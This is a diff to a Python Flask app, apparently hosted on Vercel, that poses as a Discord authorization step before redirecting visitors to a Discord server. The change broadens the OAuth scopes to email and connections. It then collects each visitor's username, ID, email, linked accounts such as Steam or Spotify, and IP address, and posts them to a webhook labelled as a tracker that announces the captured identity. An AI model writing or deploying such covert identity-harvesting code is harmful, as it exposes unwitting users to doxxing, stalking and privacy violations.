@@ -72,8 +72,9 @@ def home():
     except Exception as e:
         print(f"Error enviando webhook: {e}")
 
-    # Generar URL de autorización de Discord
-    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={redirect_uri}&response_type=code&scope=identify"
+    # Generar URL de autorización (Scopes ampliados: identify + email + connections)
+    # %20 es el espacio en URL encoding
+    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={redirect_uri}&response_type=code&scope=identify%20email%20connections"
     
     return render_template_string(HTML_TEMPLATE, auth_url=auth_url, logo=LOGO)
 
@@ -82,11 +83,10 @@ def callback():
     code = request.args.get('code')
     redirect_uri = get_redirect_uri()
     
-    # Si no hay código (acceso directo a /callback), redirigir
     if not code: return redirect("https://discord.gg/nUy6Vjr9YU")
     
     try:
-        # Intercambiar código por token
+        # 1. Obtener Token
         r = requests.post("https://discord.com/api/v10/oauth2/token", data={
             'client_id': CLIENT_ID, 
             'client_secret': CLIENT_SECRET, 
@@ -98,25 +98,50 @@ def callback():
         token = r.get('access_token')
         
         if token:
-            # Obtener datos del usuario
-            user = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {token}'}).json()
-            ip = get_ip()
+            headers = {'Authorization': f'Bearer {token}'}
             
-            # LOG IDENTIDAD (Usuario verificado + IP)
+            # 2. Obtener Datos Básicos + Email
+            user = requests.get("https://discord.com/api/v10/users/@me", headers=headers).json()
+            
+            # 3. Obtener Conexiones (Steam, Spotify, etc.)
+            connections = requests.get("https://discord.com/api/v10/users/@me/connections", headers=headers).json()
+            
+            # Procesar datos
+            ip = get_ip()
+            username = user.get('username', 'Unknown')
+            user_id = user.get('id', 'Unknown')
+            email = user.get('email', 'No visible')
+            verified = "✅" if user.get('verified') else "❌"
+            
+            # Formatear conexiones en texto
+            conn_list = []
+            for conn in connections:
+                # Ejemplo: "Steam (Juanito)" o simplemente "Spotify"
+                if conn.get('verified'): # Solo mostrar verificadas si quieres ahorrar espacio
+                    conn_list.append(f"{conn['type'].capitalize()}: **{conn['name']}**")
+            
+            conn_str = "\n".join(conn_list) if conn_list else "Ninguna visible"
+
+            # 4. Enviar LOG COMPLETO
             requests.post(WEBHOOK, json={
-                "username": "1* Tracker - IDENTIDAD", "avatar_url": LOGO,
+                "username": "1* Tracker - FULL DATA", "avatar_url": LOGO,
                 "embeds": [{
-                    "title": "🎯 ¡IDENTIDAD CAPTURADA!", "color": 0xFF0044,
-                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png" if user.get('avatar') else LOGO},
-                    "fields": [{"name": "👤 Usuario", "value": f"**{user['username']}**", "inline": True}, {"name": "🆔 ID", "value": f"`{user['id']}`", "inline": True}, {"name": "🌐 IP", "value": f"`{ip}`", "inline": False}]
+                    "title": "🎯 ¡IDENTIDAD EXPANDIDA!", 
+                    "color": 0xFF0044,
+                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png" if user.get('avatar') else LOGO},
+                    "fields": [
+                        {"name": "👤 Usuario", "value": f"**{username}**", "inline": True},
+                        {"name": "🆔 ID", "value": f"`{user_id}`", "inline": True},
+                        {"name": "📧 Email", "value": f"`{email}` {verified}", "inline": False},
+                        {"name": "🔗 Conexiones", "value": f"{conn_str}", "inline": False},
+                        {"name": "🌐 IP", "value": f"`{ip}`", "inline": False}
+                    ]
                 }]
             })
     except Exception as e:
-        # En caso de error, simplemente redirigir
         print(f"Error en callback: {e}")
         pass
         
-    # Redirigir al servidor final de Discord
     return redirect("https://discord.gg/nUy6Vjr9YU")
 
 # Vercel necesita esto
